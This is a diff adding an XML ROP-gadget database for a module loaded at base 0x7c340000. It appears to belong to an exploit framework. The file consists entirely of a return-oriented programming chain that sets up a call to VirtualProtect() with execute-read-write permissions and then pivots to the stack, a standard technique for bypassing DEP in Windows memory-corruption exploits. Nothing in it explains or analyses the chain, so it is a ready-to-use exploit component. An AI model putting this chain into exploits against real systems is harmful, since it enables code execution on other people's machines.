@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<db>
+<rop>
+	<compatibility>
+		<target>*</target>
+	</compatibility>
+
+	<gadgets base="0x7c340000">
+		<gadget offset="0x0000252c">POP EBP # RETN</gadget>
+		<gadget offset="0x0000252c">skip 4 bytes</gadget>
+		<gadget offset="0x0002c55a">POP EBX # RETN</gadget>
+		<gadget value="0x00000400">0x00000400-> ebx</gadget>
+		<gadget offset="0x00005249">POP EDX # RETN</gadget>
+		<gadget value="0x00000040">0x00000040-> edx</gadget>
+		<gadget offset="0x000011c0">POP ECX # RETN</gadget>
+		<gadget offset="0x00051897">Writable location</gadget>
+		<gadget offset="0x0000b8d7">POP EDI # RETN</gadget>
+		<gadget offset="0x00006c0b">RETN (ROP NOP)</gadget>
+		<gadget offset="0x00026fa6">POP ESI # RETN</gadget>
+		<gadget offset="0x000015a2">JMP [EAX]</gadget>
+		<gadget offset="0x000362fb">POP EAX # RETN</gadget>
+		<gadget offset="0x0003a151">ptr to VirtualProtect()</gadget>
+		<gadget offset="0x00038c81">PUSHAD # ADD AL,0EF # RETN</gadget>
+		<gadget offset="0x00005c30">ptr to 'push esp #  ret</gadget>
+	</gadgets>
+</rop>
+</db>
